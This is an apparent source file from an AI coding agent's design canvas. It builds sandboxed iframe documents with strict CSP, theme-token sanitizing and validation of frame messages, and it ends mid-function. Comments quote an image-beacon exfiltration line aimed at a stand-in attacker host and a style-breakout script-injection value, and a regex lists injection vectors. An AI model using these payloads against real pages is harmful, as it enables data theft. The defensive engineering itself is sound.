/**
 * Mysti - AI Coding Agent
 * Copyright (c) 2025 DeepMyst Inc. All rights reserved.
 *
 * Author: Baha Abunojaim <baha@deepmyst.com>
 * Website: https://www.deepmyst.com/mysti
 *
 * This file is part of Mysti, licensed under the Apache License, Version 2.0.
 * See the LICENSE file in the project root for full license terms.
 *
 * SPDX-License-Identifier: Apache-2.0
 */

import type { ArtifactPage, DesignTheme, CanvasFormatSpec } from '../types';
import { putOwn, type DocNode, type Mid } from '../canvas/doc/DocNode';
import { isLegacyPage, pageHtml, pageJsx, pageMode } from '../canvas/pageMigration';

/**
 * Builds the self-contained HTML document for a page's sandboxed iframe (Plan 05
 * M1 / §5, rebuilt for Plan 22 Phase 2). The iframe runs with
 * `sandbox="allow-scripts"` only — **no** `allow-same-origin` (fixes F-6) — so
 * every script is inlined as text; nothing loads over the network. The document
 * injects the theme as CSS custom properties and sizes a fixed design-px page
 * box from the format (real device px for app/web screens).
 *
 * Three render modes, decided by the page itself:
 *
 * | mode   | body                                   | Babel | CSP |
 * |--------|----------------------------------------|-------|-----|
 * | `doc`  | bootstrap `DocNode` JSON, interpreted  | never | {@link DOC_SANDBOX_INNER_CSP} (no `unsafe-eval`) |
 * | `jsx`  | legacy `function Page()` source        | yes   | {@link SANDBOX_INNER_CSP} |
 * | `html` | legacy raw HTML, already in the DOM    | no    | {@link SANDBOX_INNER_CSP} |
 *
 * A `jsx` page is COMPILED in the frame, so it renders only where the governing
 * policy actually grants `'unsafe-eval'` — see {@link canEval}. Inside the
 * canvas panel it does not: an artboard is a `srcdoc` frame, which inherits the
 * shell's `script-src 'nonce-…' <cspSource>`, and no meta of its own can widen
 * that. Such a frame therefore ships a static "code page" notice instead of a
 * compiler it cannot run, because the alternative was measured and it is a
 * blank white rectangle painted over the artboard's own static preview.
 *
 * `doc` is the steady state, and it is why 2,983,904 bytes of `babel.min.js`
 * leave every frame: a document-first page is INTERPRETED by `harness.js`, so
 * there is nothing to compile. Babel is emitted only for a `legacy` JSX page,
 * from its own {@link SandboxRuntime.babel} slot — passing it in `headScripts`
 * would put it back into every frame, which is the regression this split exists
 * to make impossible.
 *
 * Pure + testable: the actual vendor runtime (React/Recharts/Babel UMD) and the
 * local `ui-primitives.js`/`harness.js` are passed in as inlined script text by
 * the webview, so this builder is exercised without bundling React.
 */

export const PAGE_ROOT_ID = '__mysti_page';
export const PAGE_JSX_SCRIPT_ID = '__mysti_page_jsx';
/** `<script type="application/json">` holding the bootstrap doc for `doc` mode. */
export const PAGE_DOC_SCRIPT_ID = '__mysti_page_doc';

/**
 * Default inner CSP for the built page document (Plan 18 W4 6.2: export-bundle
 * pages previously shipped with NO CSP). MIRROR: this string must stay in sync
 * with `SANDBOX_INNER_CSP` in src/webview/canvasContent.ts, which injects the
 * same policy into the JS mirror builder `buildPageSrcdoc` in
 * media/canvas/canvas.js — the TS and JS builders are mirrors of each other.
 * The webview path inlines the runtime as text, so no script source-list
 * entries are needed there; `buildPageDocument` widens `script-src` only when
 * the runtime arrives via `<script src>` (see `defaultCspFor`).
 */
export const SANDBOX_INNER_CSP =
  "default-src 'none'; script-src 'unsafe-inline' 'unsafe-eval'; " +
  "style-src 'unsafe-inline'; img-src data: blob: https:; font-src data: https:; connect-src 'none';";

/**
 * The hardened policy for a **document-first** page (§3.6, "sandbox is a
 * property of content"). Strictly tighter than {@link SANDBOX_INNER_CSP} on
 * three axes, each of which is now affordable because the page is interpreted
 * rather than compiled:
 *
 * - **no `'unsafe-eval'`** — nothing in a `doc` frame calls `eval`/`new
 *   Function`; only the Babel legacy path ever did;
 * - **no `https:` in `img-src`** — assets are content-addressed and resolved to
 *   a webview URI, so remote images are not load-bearing, and dropping the
 *   scheme closes the GET-beacon exfiltration channel a prompt-injected page
 *   would otherwise have (`<img src="https://attacker/?"+secret>`). A caller
 *   that resolves `asset://` to a non-`data:` URI passes its own source via
 *   {@link BuildPageDocOptions.imgSources};
 * - **`form-action 'none'`, `base-uri 'none'`, `frame-src 'none'`,
 *   `object-src 'none'`** — a design has no forms, no nested frames and no
 *   plugins, so every one of those is a pure exfiltration/navigation surface.
 *
 * Legacy frames deliberately keep {@link SANDBOX_INNER_CSP}: they render
 * pre-existing third-party HTML that may well reference remote images, and
 * tightening them would be a silent content regression rather than a security
 * win on new content.
 */
export const DOC_SANDBOX_INNER_CSP =
  "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; " +
  "img-src data: blob:; font-src data:; connect-src 'none'; form-action 'none'; " +
  "base-uri 'none'; frame-src 'none'; object-src 'none';";

export interface SandboxRuntime {
  /**
   * Script *contents* inlined into <head> in load order (React, ReactDOM,
   * Recharts, Babel, ui-primitives). Required for the no-same-origin iframe
   * srcdoc (nothing loads over the network).
   */
  headScripts?: string[];
  /**
   * Alternative to `headScripts`: load the runtime via `<script src>` URLs
   * (webview `asWebviewUri` or relative paths for a standalone preview) instead
   * of inlining. Use when the host CSP permits the source.
   */
  headScriptSrcs?: string[];
  /**
   * Babel standalone, as script *content*, for LEGACY JSX pages only.
   *
   * Kept out of {@link headScripts} on purpose: a `doc` page never compiles
   * anything, and this slot is the mechanism that guarantees it never ships the
   * 2.98 MB runtime. `buildPageDocument` emits it if and only if the page
   * renders in `jsx` mode.
   */
  babel?: string;
  /** Alternative to {@link babel}: load Babel via `<script src>` (export bundle). */
  babelSrc?: string;
  /** The harness script content (runs last in <body>: interpret/mount/report/guard). */
  harness?: string;
  /** Alternative: load the harness via `<script src>`. */
  harnessSrc?: string;
  /** Optional extra stylesheet (utility classes). */
  css?: string;
}

export interface BuildPageDocOptions {
  /**
   * The PARENT webview's CSP nonce. A `srcdoc` frame INHERITS the parent policy
   * (`script-src 'nonce-…' <cspSource>`, no `'unsafe-inline'`) and its own meta
   * cannot widen it — so without this every script in the frame is refused, the
   * harness never runs and the artboard renders blank. Omitted for the export
   * bundle and PNG capture, which are standalone documents.
   */
  nonce?: string;
  page: ArtifactPage;
  theme: DesignTheme;
  format: CanvasFormatSpec;
  runtime: SandboxRuntime;
  /** Resolve an `asset://…` ref to a URL the iframe can load (webview/asset URI). */
  resolveAsset?: (ref: string) => string;
  /**
   * Content-Security-Policy meta for the document. Defaults to
   * {@link SANDBOX_INNER_CSP}, widened with `'self'`/`data:` script sources
   * when the runtime is `<script src>`-loaded (export bundle / PNG capture).
   * Pass a string to override, or `false` to omit the meta entirely (only for
   * consumers whose host already enforces a stricter policy).
   */
  csp?: string | false;
  /**
   * Render this document instead of the page's own. Used by the streaming path
   * (a speculative partial doc) and by tests; absent in the normal case, where
   * `page.doc` is the source of truth.
   */
  doc?: DocNode;
  /**
   * Extra `img-src` source expressions for `doc` mode — normally the webview's
   * `cspSource`, so `asset://` refs resolved to `vscode-webview://…` load.
   * Entries containing CSP-structural characters are dropped rather than
   * concatenated, so a caller cannot accidentally (or maliciously) append a
   * whole new directive.
   */
  imgSources?: readonly string[];
}

const ASSET_REF_RE = /asset:\/\/[^\s"'`)<>]+/g;
/** A CSP source expression: no whitespace, quotes, or directive separators. */
const CSP_SOURCE_RE = /^[A-Za-z0-9*.:/_-]{1,256}$/;

/**
 * The theme flattened to `{ 'color-primary': '#635BFF', … }` — the token names
 * WITHOUT the `--theme-` prefix.
 *
 * One implementation, two consumers: {@link buildThemeCssVars} bakes it into
 * the document at build time, and the frame protocol ships the same record as
 * `mount.themeTokens` so a theme change is a ~1 KB port message instead of a
 * frame rebuild. Deriving both from this function is what stops the baked CSS
 * and the live swap from drifting (§2.9, one implementation per seam).
 */
export function themeTokenMap(theme: DesignTheme): Record<string, string> {
  const out: Record<string, string> = {};
  for (const [name, value] of Object.entries(theme.colors)) {
    out[`color-${kebab(name)}`] = value;
  }
  out['font-body'] = theme.typography.fontFamily;
  out['font-heading'] = theme.typography.headingFamily ?? theme.typography.fontFamily;
  out['line-height'] = String(theme.typography.lineHeight);
  out['weight-regular'] = String(theme.typography.weights.regular);
  out['weight-medium'] = String(theme.typography.weights.medium);
  out['weight-bold'] = String(theme.typography.weights.bold);
  out['space-unit'] = `${theme.spacing.unit}px`;
  for (const [k, v] of Object.entries(theme.radii)) {
    out[`radius-${kebab(k)}`] = typeof v === 'number' ? `${v}px` : String(v);
  }
  for (const [k, v] of Object.entries(theme.shadows)) {
    out[`shadow-${kebab(k)}`] = v;
  }
  return out;
}

/**
 * A token NAME that can be spelled as `--theme-<name>` without closing the
 * declaration. Mirrors `TOKEN_NAME_RE` in `resources/canvas-sandbox/harness.js`.
 */
const THEME_TOKEN_NAME_RE = /^[a-z0-9-]{1,64}$/;
/** Ceiling mirroring the harness's own value cap. */
const THEME_TOKEN_VALUE_MAX = 512;
/** Value substrings that are CSS-active rather than CSS-data. */
const THEME_TOKEN_VALUE_BAD =
  /[;{}<>]|url\s*\(|expression\s*\(|image-set\s*\(|@import|javascript\s*:|vbscript\s*:|behaviou?r\s*:|-moz-binding/i;

/**
 * True when `value` is legal as a CSS custom-property value in a baked
 * `:root { … }` block.
 *
 * A custom-property value has a narrow grammar, so this VALIDATES rather than
 * escapes: `;` `{` `}` end the declaration or the rule, and `<` `>` end the
 * `<style>` element itself. `url(` is refused outright because a legacy frame
 * keeps {@link SANDBOX_INNER_CSP} (`img-src … https:`), which would turn a
 * token substituted into an allowlisted `background: var(--theme-color-*)` into
 * a working GET beacon.
 */
function isSafeThemeTokenValue(value: string): boolean {
  if (typeof value !== 'string') { return false; }
  if (value.length === 0 || value.length > THEME_TOKEN_VALUE_MAX) { return false; }
  if (hasControlChar(value)) { return false; }
  return !THEME_TOKEN_VALUE_BAD.test(value);
}

/** C0 controls + DEL. Checked here rather than in a regex (`no-control-regex`). */
function hasControlChar(value: string): boolean {
  for (let i = 0; i < value.length; i++) {
    const code = value.charCodeAt(i);
    if (code < 0x20 || code === 0x7f) { return true; }
  }
  return false;
}

/**
 * {@link themeTokenMap} filtered to the tokens that are safe to interpolate.
 *
 * CANVAS-SEC-1: the theme was the ONE model-authored string `buildPageDocument`
 * concatenated raw — every other one goes through `jsonForScript` or
 * `escapeForScript` — so a `set_theme` value of
 * `red; } </style><script>…</script><style> x{y:z` closed the stylesheet and
 * ran a script in `<head>`, i.e. ahead of `harness.js`, where it could read the
 * transferred frame port off the same handshake event. Theme values are
 * reachable by the agent (`set_theme`/`set_theme_token`), by a Figma import,
 * and by a hostile `.mysti/canvas/<id>/artifact.json`, none of which validate
 * values.
 *
 * This is the SHARED safe map first principle 9 asks for: `buildThemeCssVars`
 * and the frame bootstrap both derive from it, and it enforces the same grammar
 * the other two consumers already enforce independently
 * (`harness.js applyThemeTokens`, `sandboxDoc.themeCssVars`) — so a fourth
 * consumer cannot be added without the sanitizer.
 *
 * A refused token is DROPPED, never half-written: `var(--theme-color-primary)`
 * then falls back rather than inheriting an attacker's declaration.
 */
export function safeThemeTokenMap(theme: DesignTheme): Record<string, string> {
  const out: Record<string, string> = {};
  for (const [name, value] of Object.entries(themeTokenMap(theme))) {
    if (!THEME_TOKEN_NAME_RE.test(name)) { continue; }
    if (!isSafeThemeTokenValue(value)) { continue; }
    putOwn(out, name, value);
  }
  return out;
}

/** Emit the theme as `--theme-*` CSS custom properties on `:root`. */
export function buildThemeCssVars(theme: DesignTheme): string {
  const lines = Object.entries(safeThemeTokenMap(theme)).map(([k, v]) => `--theme-${k}: ${v};`);
  return `:root {\n  ${lines.join('\n  ')}\n}`;
}

/** Replace `asset://…` tokens in a source string using the resolver. */
export function rewriteAssetTokens(source: string, resolve?: (ref: string) => string): string {
  if (!resolve) { return source; }
  return source.replace(ASSET_REF_RE, ref => resolve(ref));
}

/** How a page's body is delivered to the frame — see the table on this module. */
export type PageRenderMode = 'doc' | 'jsx' | 'html';

/**
 * The render mode for a page.
 *
 * A page is document-first unless it is parked as {@link ArtifactPage.legacy};
 * an explicit `doc` override always wins (the streaming path renders a
 * speculative partial doc for a page whose stored source may still be legacy).
 */
export function pageRenderMode(page: ArtifactPage, docOverride?: DocNode): PageRenderMode {
  if (docOverride) { return 'doc'; }
  if (!isLegacyPage(page)) { return 'doc'; }
  return pageMode(page);
}

/**
 * May this page's frame be handed a privileged host⇄frame port?
 *
 * **Only a `doc` frame.** The port is the channel whose messages the board
 * turns into ops that `CanvasBridge` stamps `author: 'user'`, `actorId:
 * 'canvas-view'`, approval `'auto'` — a human gesture. That stamp is honest
 * exactly when nothing but `harness.js` can speak on the channel, which is true
 * only for a document-first page: it is INTERPRETED, and its frame carries
 * {@link DOC_SANDBOX_INNER_CSP} with no `'unsafe-eval'`.
 *
 * A `legacy` page is the opposite (P1). Its frame executes model-authored
 * JavaScript in the SAME realm and SAME window as the harness under
 * {@link SANDBOX_INNER_CSP} (`script-src 'unsafe-inline' 'unsafe-eval'`) — for
 * `jsx` via `new Function` on the compiled source, and for `html` from inline
 * script that the srcdoc parses BEFORE the harness tag. The transferred port
 * arrives as an ordinary `window` `message` event, so such a script can read
 * `ev.ports[0]` off the same event the harness reads, or register first and
 * `stopImmediatePropagation()` the handshake to bind it exclusively. The
 * harness's own `ev.source !== window.parent` guard discriminates the SENDER,
 * not which in-frame listener receives, so it cannot close this.
 *
 * Legacy artboards lose nothing they could use: they are badged "code page —
 * not directly editable", have no addressable mids, and render entirely from
 * the srcdoc bootstrap. `mount`/`patch`/`select`/`beginTextEdit` are all
 * meaningless for them — indeed the `mount` the board used to post switched the
 * harness to `doc` mode and rendered the placeholder doc OVER the legacy
 * content.
 */
export function isTrustedFrameChannel(page: ArtifactPage, docOverride?: DocNode): boolean {
  return pageRenderMode(page, docOverride) === 'doc';
}

/** Assemble the full iframe document for a page. */
export function buildPageDocument(opts: BuildPageDocOptions): string {
  const { page, theme, format, runtime, resolveAsset } = opts;
  const mode = pageRenderMode(page, opts.doc);

  const nonce = opts.nonce;
  // 6.2: pages are self-contained + potentially model-authored — always carry a
  // CSP (no network beyond the whitelisted image/font sources) unless the
  // caller explicitly opts out. Mirrors the webview's inner CSP (canvas.js).
  // Computed BEFORE the body: whether the frame may compile a legacy page is a
  // property of the policy it will run under.
  const cspContent = opts.csp === false ? '' : (opts.csp ?? defaultCspFor(runtime, mode, opts.imgSources));
  const cspMeta = cspContent
    ? `\n<meta http-equiv="Content-Security-Policy" content="${escapeAttr(cspContent)}">`
    : '';
  // A legacy JSX page is COMPILED in the frame (`Babel.transform` then `new
  // Function`), so it renders only where `'unsafe-eval'` is actually available.
  const legacyStatic = mode === 'jsx' && !canEval(nonce, cspContent);

  // Nothing in the frame uses React/Babel when the page is a static notice, and
  // the 2.98 MB compiler least of all.
  const inlined = legacyStatic ? [] : (runtime.headScripts ?? []).map(c => inlineScript(c, nonce));
  const sourced = legacyStatic ? [] : (runtime.headScriptSrcs ?? []).map(src => srcScript(src, nonce));
  // Babel rides in its own slot and is emitted ONLY for a legacy JSX frame, so
  // a doc page cannot regress into shipping the 2.98 MB compiler.
  const babel = mode !== 'jsx' || legacyStatic ? ''
    : runtime.babelSrc ? srcScript(runtime.babelSrc, nonce)
      : runtime.babel ? inlineScript(runtime.babel, nonce) : '';
  const headScripts = [...sourced, ...inlined, ...(babel ? [babel] : [])].join('\n');
  const harness = runtime.harnessSrc ? srcScript(runtime.harnessSrc, nonce)
    : runtime.harness ? inlineScript(runtime.harness, nonce) : '';
  const themeVars = buildThemeCssVars(theme);
  const baseCss = buildBaseCss(format);

  let body: string;
  if (legacyStatic) {
    // `data-mode="static"` falls into the harness's third branch: report size,
    // touch nothing. `jsx` would send it to `runLegacyJsx`, which would find no
    // source and report an error nobody can see.
    body = legacyNoticeBody(page);
  } else if (mode === 'doc') {
    // The bootstrap payload renders the page with NO host attached (export
    // bundle, PNG capture, standalone preview). When a host IS attached it hands
    // the frame a MessageChannel port and drives it with `mount`/`patch` instead.
    const bootstrap = rewriteAssetTokens(
      jsonForScript({ doc: opts.doc ?? page.doc, themeTokens: safeThemeTokenMap(theme), format: wireFormat(format) }),
      resolveAsset,
    );
    body =
      `<div id="${PAGE_ROOT_ID}"></div>\n` +
      `<script${nonceAttr(nonce)} type="application/json" id="${PAGE_DOC_SCRIPT_ID}">${bootstrap}</script>`;
  } else if (mode === 'jsx') {
    const jsx = rewriteAssetTokens(pageJsx(page), resolveAsset);
    body =
      `<div id="${PAGE_ROOT_ID}"></div>\n` +
      `<script${nonceAttr(nonce)} type="text/plain" id="${PAGE_JSX_SCRIPT_ID}">${escapeForScript(jsx)}</script>`;
  } else {
    const html = rewriteAssetTokens(pageHtml(page) ?? '', resolveAsset);
    body = `<div id="${PAGE_ROOT_ID}">${html}</div>`;
  }

  return `<!doctype html>
<html lang="en" data-mode="${legacyStatic ? 'static' : mode}" data-format="${escapeAttr(format.formatId)}">
<head>
<meta charset="utf-8">${cspMeta}
<meta name="viewport" content="width=${format.width}, initial-scale=1">
<style>
${themeVars}
${baseCss}
${runtime.css ?? ''}
</style>
${headScripts}
</head>
<body>
${body}
${harness}
</body>
</html>`;
}

// ── helpers ──────────────────────────────────────────────────────────────

/**
 * May scripts in this document call `eval` / `new Function`?
 *
 * Only a LEGACY JSX page cares: `harness.runLegacyJsx` compiles the stored
 * source with Babel and then executes it through `new Function`. A `doc` page
 * is interpreted and never asks.
 *
 * Two inputs, because a frame is governed by two policies:
 *
 * - **`nonce`** — stamped only on the in-panel `srcdoc` path. A `srcdoc`
 *   document INHERITS the embedder's policy, the canvas shell ships
 *   `script-src 'nonce-…' <cspSource>` with no `'unsafe-eval'`, and the frame's
 *   own meta cannot widen an inherited policy. So a nonce means eval is
 *   unavailable no matter what this document's own CSP says — measured: `new
 *   Function` threw `EvalError` and the artboard painted an empty page box over
 *   its own static preview, silently (the harness's `page_render_error` rides
 *   the window channel, which `protocolClient` drops).
 * - **this document's own CSP** — the export bundle and PNG capture are
 *   standalone documents with no embedder, so their own `script-src` decides.
 *   `exportPageCsp` already hands a legacy page `EXPORT_LEGACY_PAGE_CSP`, and
 *   Present passes `viewerCsp({allowEval: presentNeedsEval(...)})`, so both
 *   keep compiling exactly as before.
 *
 * An empty policy means the caller opted out (`csp: false`) and its host
 * enforces its own — assume eval, which is what that path did before.
 */
function canEval(nonce: string | undefined, csp: string): boolean {
  if (nonce) { return false; }
  if (!csp) { return true; }
  // `\s` rather than `\b` after the directive name, so `script-src-elem` (which
  // does not govern `eval`) cannot be read as `script-src`.
  const script = /(?:^|;)\s*script-src\s([^;]*)/i.exec(csp);
  // No `script-src` at all → `default-src` governs, and every policy this
  // builder emits defaults to `'none'`.
  const sources = script ? script[1] : (/(?:^|;)\s*default-src\s([^;]*)/i.exec(csp)?.[1] ?? '');
  return /'unsafe-eval'/i.test(sources);
}

/**
 * The body of a legacy JSX artboard that cannot be compiled where it is being
 * rendered — an honest placeholder instead of a blank rectangle.
 *
 * The alternative was worse than nothing: the frame mounted, every script was
 * refused, and the opaque `.artboard-frame` background painted over the static
 * preview that had been showing a second earlier, with no error card, no
 * `canvas/frameError` and nothing in the run's steering inbox. Present renders
 * the same page correctly (it grants `'unsafe-eval'` when the deck needs it),
 * which is what this notice points the user at.
 *
 * All static markup plus two escaped strings; the page's own source is NOT
 * emitted, so no model-authored script text enters the panel's frame at all.
 */
function legacyNoticeBody(page: ArtifactPage): string {
  const reason = (page.compileError ?? '').trim().slice(0, 240);
  const box =
    'position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;'
    + 'justify-content:center;gap:10px;padding:24px;text-align:center;'
    + 'font-family:var(--theme-font-body);color:var(--theme-color-text);opacity:0.85;';
  const badge =
    'font-size:11px;letter-spacing:0.08em;text-transform:uppercase;padding:3px 10px;'
    + 'border-radius:999px;border:1px solid currentColor;opacity:0.7;';
  const line = 'margin:0;max-width:48ch;font-size:14px;line-height:1.5;';
  const why = 'margin:0;max-width:56ch;font-size:11px;line-height:1.5;opacity:0.6;'
    + 'font-family:ui-monospace,SFMono-Regular,Menlo,monospace;';
  return `<div id="${PAGE_ROOT_ID}"><div role="note" style="${escapeAttr(box)}">`
    + `<span style="${escapeAttr(badge)}">Code page</span>`
    + `<p style="${escapeAttr(line)}">This artboard is legacy JSX, and page code cannot run inside the editor. `
    + `Open Present to view it as it renders.</p>`
    + (reason ? `<p style="${escapeAttr(why)}">${escapeText(reason)}</p>` : '')
    + `</div></div>`;
}

/**
 * The default CSP for a runtime delivery mode: inlined runtime → the exact
 * webview mirror policy; `<script src>` runtime → `script-src` additionally
 * allows `'self'` (bundle-relative runtime files) and/or `data:` (the PNG
 * capture path inlines the runtime as data: URIs). Everything else (no
 * connect-src, no frames, restricted img/font sources) stays identical.
 */
function defaultCspFor(
  runtime: SandboxRuntime,
  mode: PageRenderMode = 'jsx',
  imgSources?: readonly string[],
): string {
  const srcs = [
    ...(runtime.headScriptSrcs ?? []),
    ...(runtime.harnessSrc ? [runtime.harnessSrc] : []),
    ...(mode === 'jsx' && runtime.babelSrc ? [runtime.babelSrc] : []),
  ];
  const extras: string[] = [];
  if (srcs.some(s => s.startsWith('data:'))) { extras.push('data:'); }
  if (srcs.some(s => !s.startsWith('data:'))) {
    // W4 review: exported bundles with relative <script src> are opened from
    // DISK — Chromium gives file:// pages an opaque origin where 'self' does
    // not match, so the runtime scripts would be blocked. `file:` keeps the
    // export working while still blocking all network script sources.
    extras.push("'self'", 'file:');
  }

  if (mode === 'doc') {
    // Document-first frames get the hardened policy: no eval, no remote images.
    let csp = DOC_SANDBOX_INNER_CSP;
    if (extras.length) {
      csp = csp.replace("script-src 'unsafe-inline'", `script-src 'unsafe-inline' ${extras.join(' ')}`);
    }
    const imgExtras = [
      ...(imgSources ?? []).filter(s => CSP_SOURCE_RE.test(s)),
      ...(extras.includes("'self'") ? ['file:'] : []),
    ];
    if (imgExtras.length) {
      csp = csp.replace('img-src data: blob:', `img-src data: blob: ${imgExtras.join(' ')}`);
    }
    return csp;
  }

  if (extras.length === 0) { return SANDBOX_INNER_CSP; }
  let csp = SANDBOX_INNER_CSP.replace(
    "script-src 'unsafe-inline' 'unsafe-eval'",
    `script-src 'unsafe-inline' 'unsafe-eval' ${extras.join(' ')}`,
  );
  if (extras.includes("'self'")) {
    // Same file://-origin problem for relative image assets in the export.
    csp = csp.replace('img-src data: blob: https:', 'img-src data: blob: https: file:');
  }
  return csp;
}

/** The subset of a format the frame needs; never the whole catalog entry. */
function wireFormat(format: CanvasFormatSpec): { formatId: string; width: number; height: number } {
  return { formatId: format.formatId, width: format.width, height: format.height };
}

/**
 * Serialize the bootstrap payload for a `<script type="application/json">`.
 *
 * `<` is escaped to `<` — a valid JSON string escape — so no value can
 * emit `</script` and break out of the block, and a `<!--` inside a value
 * cannot open an HTML comment that swallows the rest of the document.
 */
function jsonForScript(value: unknown): string {
  let json: string;
  try {
    json = JSON.stringify(value) ?? 'null';
  } catch {
    // A cyclic or non-serializable doc must not take the whole frame down.
    json = 'null';
  }
  return json.replace(/</g, '\\u003c');
}

function buildBaseCss(format: CanvasFormatSpec): string {
  return [
    `html, body { margin: 0; padding: 0; }`,
    `body { font-family: var(--theme-font-body); line-height: var(--theme-line-height); color: var(--theme-color-text); background: var(--theme-color-background); }`,
    `* { box-sizing: border-box; }`,
    // Fixed design-px page box; the parent scales the iframe via CSS transform.
    `#${PAGE_ROOT_ID} { width: ${format.width}px; min-height: ${format.height}px; overflow: hidden; position: relative; }`,
  ].join('\n');
}

/**
 * A `srcdoc` frame INHERITS its parent's CSP in Chromium, and the canvas
 * webview ships `script-src 'nonce-<random>' <cspSource>` — no `'unsafe-inline'`.
 * An un-nonced inline script in the frame is therefore refused outright, and the
 * frame's OWN policy cannot widen the inherited one. That silently blocked
 * React, the UI primitives and `harness.js` in every live artboard: the harness
 * never ran, no MessagePort was ever bound, and the opaque page background
 * painted a blank rectangle over the static preview.
 *
 * The nonce grants no authority the frame did not already have — it is sandboxed
 * `allow-scripts` WITHOUT `allow-same-origin`, so it has an opaque origin and
 * cannot reach the parent DOM or `acquireVsCodeApi`. The frame boundary is the
 * security control; the CSP was only ever gating the runtime we ship ourselves.
 */
function nonceAttr(nonce: string | undefined): string {
  return nonce ? ` nonce="${escapeAttr(nonce)}"` : '';
}

function inlineScript(content: string, nonce?: string): string {
  return `<script${nonceAttr(nonce)}>${escapeForScript(content)}</script>`;
}

function srcScript(src: string, nonce?: string): string {
  return `<script${nonceAttr(nonce)} src="${escapeAttr(src)}"></script>`;
}

/** Neutralize a closing-script sequence so embedded code can't break out. */
function escapeForScript(s: string): string {
  return s.replace(/<\/script/gi, '<\\/script');
}

function escapeAttr(s: string): string {
  return s.replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/</g, '&lt;');
}

/** Escape a string that becomes ELEMENT CONTENT (the legacy compile reason). */
function escapeText(s: string): string {
  return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

function kebab(s: string): string {
  return s.replace(/([a-z0-9])([A-Z])/g, '$1-$2').toLowerCase();
}

/* ────────────────────────── the frame port protocol ────────────────────────── */

/**
 * Plan 22 §3.4 — the host ⇄ frame contract, declared next to the builder that
 * emits the harness so the two cannot drift.
 *
 * This is a SECOND, structurally separate channel from the host ⇄ webview
 * protocol in `src/canvas/protocol.ts`: the board talks to each artboard over a
 * dedicated `MessageChannel` port, so page traffic and host traffic are
 * different objects rather than two shapes on one `window.onmessage`. That is
 * what lets the shell delete the `ev.source !== window` heuristic it currently
 * relies on (and itself flags as unverified) — and it means a model-authored
 * page can neither observe nor forge host traffic.
 */
export const FRAME_PROTOCOL_VERSION = 1;
/** `source` on the handshake message the host posts into the frame. */
export const FRAME_HOST_SOURCE = 'mysti-canvas-host';
/** `source` on the frame's legacy window-channel notices. */
export const FRAME_PAGE_SOURCE = 'mysti-canvas-page';

/** A box in PAGE coordinates — the parent applies the board transform. */
export interface FrameRect { x: number; y: number; w: number; h: number }

/** Modifier keys at the moment of a hit. Nothing else about the event travels. */
export interface FrameModifiers { alt: boolean; ctrl: boolean; meta: boolean; shift: boolean }

/** Host → frame, over the port. */
export type FrameDownMessage =
  /**
   * State transfer. Idempotent: re-mounting re-renders the SAME React root.
   *
   * `doc` is OPTIONAL, and omitting it is the normal case for a theme or device
   * change: the frame's tree is already current, so a re-mount that carried one
   * would be a second description of whatever element ops rode the same batch
   * (the harness applies both — two nodes, one mid) and would revert the
   * human's in-flight inline edit, which the harness ends on any document
   * replacement. A doc-less mount applies `themeTokens`/`format` and touches
   * neither the tree nor the edit.
   */
  | { t: 'mount'; doc?: DocNode; themeTokens?: Record<string, string>; format?: { formatId: string; width: number; height: number } }
  /** Steady state. Applied to the existing root — never a remount. */
  | { t: 'patch'; ops: unknown[] }
  /** Selection is drawn by the PARENT; the frame only answers with rects. */
  | { t: 'select'; mids: Mid[] }
  | { t: 'beginTextEdit'; mid: Mid }
  | { t: 'measure' };

/** Frame → host, over the port. Untrusted: always run through {@link parseFrameUpMessage}. */
export type FrameUpMessage =
  | { t: 'ready'; protocol: number }
  | { t: 'rects'; rects: Record<Mid, FrameRect> }
  | { t: 'size'; w: number; h: number }
  | { t: 'hit'; mid: Mid; rect: FrameRect; modifiers: FrameModifiers; double: boolean }
  /**
   * A wheel that happened OVER an artboard.
   *
   * An iframe swallows wheel events: they go to the frame's own document, which
   * is a sandboxed opaque origin the parent cannot listen inside. So with the
   * pointer over any artboard, zoom and pan simply stopped working. The frame
   * forwards the event instead, with the position in frame-local CSS pixels so
   * the parent can anchor the zoom exactly where the cursor is.
   */
  | { t: 'wheel'; deltaX: number; deltaY: number; deltaMode: number; ctrlKey: boolean; metaKey: boolean; x: number; y: number }
  | { t: 'textCommit'; mid: Mid; text: string }
  | { t: 'error'; message: string; stack?: string; mid?: Mid };

export type FrameUpTag = FrameUpMessage['t'];

/** The handshake the host posts into the frame, transferring `port2`. */
export function frameHandshakeMessage(): { source: string; t: 'port' } {
  return { source: FRAME_HOST_SOURCE, t: 'port' };
}

/* ── parent-side validation ── */

const FRAME_MID_RE = /^[A-Za-z0-9_-]{1,64}$/;
/** Hard ceilings mirroring the harness's own caps, so a hostile frame can't flood the host. */
const FRAME_MAX_RECTS = 4000;
const FRAME_MAX_TEXT = 20000;
const FRAME_MAX_MESSAGE = 4000;
/** A wheel notch is ~120; a page-mode delta a few. Anything past this is noise or hostile. */
const FRAME_MAX_WHEEL_DELTA = 10000;

function finiteNumber(v: unknown): v is number {
  return typeof v === 'number' && Number.isFinite(v);
}

function parseRect(v: unknown): FrameRect | null {
  if (!v || typeof v !== 'object') { return null; }
  const r = v as Record<string, unknown>;
  if (!finiteNumber(r.x) || !finiteNumber(r.y) || !finiteNumber(r.w) || !finiteNumber(r.h)) { return null; }
  return { x: r.x, y: r.y, w: r.w, h: r.h };
}

function parseModifiers(v: unknown): FrameModifiers {
  const m = (v && typeof v === 'object') ? v as Record<string, unknown> : {};
  return { alt: m.alt === true, ctrl: m.ctrl === true, meta: m.meta === true, shift: m.shift === true };
}

function clampStr(v: unknown, max: number): string {
  const s = typeof v === 'string' ? v : String(v ?? '');
  return s.length > max ? s.slice(0, max) : s;
}

/**
 * Validate a message that arrived from a sandboxed frame.
 *
 * The frame renders MODEL-AUTHORED content, so everything it says is data, not
 * fact: a compromised page could post a `textCommit` for a mid it does not own,
 * a rect with `Infinity`, a 50 MB error string, or a `rects` map with a million
 * entries. This normalizes shape and enforces the caps; **authorization** —
 * does this frame own that page, does that mid exist, is that cell pinned — is
 * still the executor's job, exactly as for any other writer.
 *
 * Returns `null` for anything unrecognized rather than a partial object, so a
 * caller cannot accidentally act on a half-valid message.
 */
export function parseFrameUpMessage(raw: unknown): FrameUpMessage | null {
  if (!raw || typeof raw !== 'object' || Array.isArray(raw)) { return null; }
  const m = raw as Record<string, unknown>;
  switch (m.t) {
    case 'ready':
